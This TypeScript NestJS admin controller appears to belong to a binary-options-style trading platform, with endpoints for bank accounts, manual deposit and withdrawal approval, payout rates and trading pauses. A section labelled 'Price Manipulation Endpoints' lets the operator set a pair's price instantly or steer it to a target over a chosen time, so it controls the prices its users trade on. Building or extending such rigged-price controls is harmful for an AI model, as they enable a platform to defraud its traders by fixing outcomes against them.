import { Controller, Get, Post, Patch, Put, Delete, Body, Param, Query, UseGuards } from '@nestjs/common';
import { AuthGuard } from '@nestjs/passport';
import { AdminConfigService } from './admin-config.service';
import { AdminMonitoringService } from './admin-monitoring.service';
import { PriceManipulationService } from '../oracle/price-manipulation.service';
import { AdminBankService } from './admin-bank.service';

@Controller('admin')
@UseGuards(AuthGuard('jwt'))
export class AdminController {
    constructor(
        private configService: AdminConfigService,
        private monitoringService: AdminMonitoringService,
        private priceManipulation: PriceManipulationService,
        private bankService: AdminBankService,
    ) { }

    @Get('banks')
    async getBanks() {
        return this.bankService.getBanks();
    }

    @Post('banks')
    async createBank(@Body() body: any) {
        return this.bankService.createBank(body);
    }

    @Put('banks/:id')
    async updateBank(@Param('id') id: string, @Body() body: any) {
        return this.bankService.updateBank(id, body);
    }

    @Delete('banks/:id')
    async deleteBank(@Param('id') id: string) {
        return this.bankService.deleteBank(id);
    }

    @Get('deposits')
    async getDeposits() {
        return this.bankService.getDeposits();
    }

    @Post('deposits/:id/approve')
    async approveDeposit(@Param('id') id: string) {
        return this.bankService.approveDeposit(id);
    }

    @Post('deposits/:id/reject')
    async rejectDeposit(@Param('id') id: string) {
        return this.bankService.rejectDeposit(id);
    }

    @Get('withdraws')
    async getWithdraws() {
        return this.bankService.getWithdraws();
    }

    @Post('withdraws/:id/approve')
    async approveWithdraw(@Param('id') id: string) {
        return this.bankService.approveWithdraw(id);
    }

    @Post('withdraws/:id/reject')
    async rejectWithdraw(@Param('id') id: string) {
        return this.bankService.rejectWithdraw(id);
    }


    @Get('dashboard')
    async getDashboard() {
        return this.monitoringService.getDashboard();
    }

    @Get('trades')
    async getTrades(@Query('status') status?: string) {
        return this.monitoringService.getTrades(status);
    }

    @Get('pairs')
    async getPairs() {
        return this.configService.getTradingPairs();
    }

    @Post('pairs')
    async createPair(@Body() body: { symbol: string; payoutRate: number }) {
        return this.configService.createPair(body.symbol, body.payoutRate);
    }

    @Patch('pairs/:id')
    async updatePair(@Param('id') id: string, @Body() body: { payoutRate?: number; isActive?: boolean }) {
        return this.configService.updatePair(id, body);
    }

    @Post('system/pause')
    async pause() {
        return this.configService.pauseTrading();
    }

    @Post('system/resume')
    async resume() {
        return this.configService.resumeTrading();
    }

    // ============ Price Manipulation Endpoints ============

    /**
     * Get all current prices
     */
    @Get('prices')
    async getAllPrices() {
        return {
            prices: this.priceManipulation.getAllBasePrices(),
            activeTargets: this.priceManipulation.getActivePriceTargets(),
        };
    }

    /**
     * Get current price for a specific pair
     */
    @Get('prices/:pair')
    async getPrice(@Param('pair') pair: string) {
        const decodedPair = decodeURIComponent(pair);
        return {
            pair: decodedPair,
            price: this.priceManipulation.getCurrentPrice(decodedPair),
        };
    }

    /**
     * Set a price target for a symbol
     * Price will gradually move towards target over the specified duration
     */
    @Post('prices/target')
    async setPriceTarget(
        @Body() body: { pair: string; targetPrice: number; durationSeconds: number }
    ) {
        const target = await this.priceManipulation.setPriceTarget(
            body.pair,
            body.targetPrice,
            body.durationSeconds,
        );
        return {
            success: true,
            target,
        };
    }

    /**
     * Set immediate price for a symbol (no gradual transition)
     */
    @Post('prices/set')
    async setImmediatePrice(@Body() body: { pair: string; price: number }) {
        this.priceManipulation.setBasePrice(body.pair, body.price);
        return {
            success: true,
            pair: body.pair,
            price: body.price,
        };
    }

    /**
     * Cancel an active price target
     */
    @Delete('prices/target/:pair')
    async cancelPriceTarget(@Param('pair') pair: string) {
        const decodedPair = decodeURIComponent(pair);
        const cancelled = this.priceManipulation.cancelPriceTarget(decodedPair);
        return {
            success: cancelled,
            pair: decodedPair,
        };
    }

    /**
     * Get active price targets
     */
    @Get('prices/targets/active')
    async getActiveTargets() {
        return this.priceManipulation.getActivePriceTargets();
    }
}
